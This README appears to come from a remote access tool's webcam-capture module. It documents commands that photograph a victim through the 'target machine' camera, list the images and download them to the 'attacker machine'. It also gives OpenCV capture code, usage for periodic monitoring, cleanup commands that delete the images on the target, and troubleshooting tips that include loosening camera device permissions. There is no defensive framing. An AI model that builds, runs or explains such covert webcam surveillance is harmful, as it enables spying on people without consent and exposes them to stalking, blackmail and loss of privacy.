# Webcam Directory

This directory stores webcam images captured from the target machine's camera.

## File Information

### File Naming Convention

- **Format:** `webcam_YYYYMMDD_HHMMSS.jpg`
- **Example:** `webcam_20251004_143022.jpg`
- **Location:** `logs/webcam/`

### Image Specifications

- **Format:** JPEG (Joint Photographic Experts Group)
- **Quality:** High (adjustable)
- **Color:** Full RGB color
- **Resolution:** Depends on webcam capability
- **Compression:** Lossy (optimized for photos)

## Commands

### Capture Webcam Image

```bash
webcam_snap
```

Captures a single image from the webcam.

**Output:**

```
Webcam image saved: logs/webcam/webcam_20251004_143022.jpg
```

### List Webcam Images

```bash
webcam_list
```

Lists all captured webcam images.

**Output:**

```
webcam_20251004_143022.jpg
webcam_20251004_150530.jpg
webcam_20251004_163045.jpg
```

### Download Images

```bash
download logs/webcam/webcam_20251004_143022.jpg
```

Downloads specific webcam image to attacker machine.

## Webcam Capture Method

### Requirements

**Library:** OpenCV (opencv-python)

**Installation:**

```bash
pip install opencv-python
```

### How It Works

1. Opens default webcam (camera index 0)
2. Captures single frame
3. Saves as JPEG image
4. Releases camera

### Technical Details

```python
import cv2

# Open webcam
camera = cv2.VideoCapture(0)

# Capture frame
ret, frame = camera.read()

# Save image
cv2.imwrite(filepath, frame)

# Release camera
camera.release()
```

## File Sizes

Typical webcam image sizes:

| Resolution          | File Size (JPEG) |
| ------------------- | ---------------- |
| 640x480 (VGA)       | 50-100 KB        |
| 1280x720 (HD)       | 100-300 KB       |
| 1920x1080 (Full HD) | 200-500 KB       |
| 2560x1440 (2K)      | 400-800 KB       |
| 3840x2160 (4K)      | 800 KB - 2 MB    |

**Note:** JPEG files are compressed, so size varies with image content.

## Common Webcam Resolutions

| Resolution | Name    | Aspect Ratio |
| ---------- | ------- | ------------ |
| 640×480    | VGA     | 4:3          |
| 1280×720   | HD      | 16:9         |
| 1920×1080  | Full HD | 16:9         |
| 2560×1440  | 2K/QHD  | 16:9         |
| 3840×2160  | 4K/UHD  | 16:9         |

## Usage Examples

### Single Capture

```bash
# Quick webcam snapshot
webcam_snap
```

### Multiple Captures

```bash
# Manual sequence (run multiple times)
webcam_snap
# Wait 5 seconds
webcam_snap
# Wait 5 seconds
webcam_snap
```

### Periodic Monitoring

```bash
# Capture every minute (run periodically)
webcam_snap
```

### Download All Images

```bash
# List all webcam images
webcam_list

# Download each one
download logs/webcam/webcam_20251004_143022.jpg
download logs/webcam/webcam_20251004_150530.jpg
```

## Cleanup

### Remove All Webcam Images

```bash
# On target machine
rm -rf logs/webcam/*

# Keep directory, delete files
rm logs/webcam/*.jpg
```

### Remove Old Images

```bash
# Remove images older than 7 days
find logs/webcam/ -name "*.jpg" -mtime +7 -delete

# Remove images older than 24 hours
find logs/webcam/ -name "*.jpg" -mtime +1 -delete
```

### Archive Before Deleting

```bash
# Create archive
tar -czf webcam_archive_$(date +%Y%m%d).tar.gz logs/webcam/*.jpg

# Delete originals
rm logs/webcam/*.jpg
```

## Troubleshooting

### Issue: "opencv-python library required"

**Solution:**

```bash
pip install opencv-python
```

### Issue: "Could not access webcam"

**Causes:**

- Webcam not connected
- Webcam in use by another application
- Permissions not granted
- Wrong camera index

**Solutions:**

1. **Check if webcam exists:**

   ```bash
   # Linux
   ls /dev/video*

   # macOS
   system_profiler SPCameraDataType
   ```

2. **Close other applications using webcam:**

   - Zoom, Skype, FaceTime, etc.
   - Browser tabs with camera access

3. **Grant camera permissions:**

   - **macOS:** System Preferences > Security & Privacy > Privacy > Camera
   - **Linux:** Check device permissions: `chmod 666 /dev/video0`
   - **Windows:** Settings > Privacy > Camera

4. **Try different camera index:**
   - Default is 0 (first camera)
   - If multiple cameras, may need index 1, 2, etc.

### Issue: Black or dark images

**Causes:**

- Poor lighting
- Camera covered
- Camera LED indicator off
- Camera not initialized properly

**Solutions:**

- Ensure adequate lighting
- Check camera isn't covered
- Wait a moment for camera to adjust
- Try capturing again

### Issue: Permission denied (file system)

**Solutions:**

```bash
# Create webcam directory
mkdir -p logs/webcam

# Set permissions
chmod 755 logs/webcam

# Check disk space
df -h
```

### Issue: Low quality images

**Causes:**

- Low resolution webcam
- Poor lighting
- Compression artifacts
- Dirty camera lens

**Solutions:**

- Use better webcam
- Improve lighting conditions
- Clean camera lens
- Adjust JPEG quality settings (in code)
